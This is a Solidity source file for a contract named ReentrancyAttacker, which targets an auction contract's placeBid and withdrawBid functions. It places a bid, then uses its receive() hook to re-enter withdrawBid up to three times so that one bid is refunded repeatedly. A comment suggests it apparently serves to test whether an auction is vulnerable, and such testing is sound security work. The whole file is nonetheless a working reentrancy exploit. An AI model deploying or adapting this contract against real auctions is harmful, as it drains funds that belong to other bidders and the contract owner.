// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAuction {
    function placeBid(uint256 auctionId) external payable;
    function withdrawBid(uint256 auctionId) external;
}

contract ReentrancyAttacker {

    IAuction public auction;
    uint256 public targetAuctionId;

    uint256 public attackCount;
    uint256 public maxAttacks = 3;

    bool public attacking;

    constructor(address auctionAddress) {
        auction = IAuction(auctionAddress);
    }

    // STEP 1: Place bid
    function placeAttackBid(uint256 auctionId) external payable {
        auction.placeBid{value: msg.value}(auctionId);
    }

    // STEP 2: Start attack
    function attackWithdraw(uint256 auctionId) external {
        targetAuctionId = auctionId;
        attackCount = 0;
        attacking = true;

        auction.withdrawBid(auctionId);
    }

    // REENTRANCY HOOK
    receive() external payable {

        if (!attacking) return;

        if (attackCount < maxAttacks) {
            attackCount++;

            // Try re-enter
            try auction.withdrawBid(targetAuctionId) {
                // If this ever succeeds multiple times → vulnerable
            } catch {
                attacking = false;
            }
        } else {
            attacking = false;
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}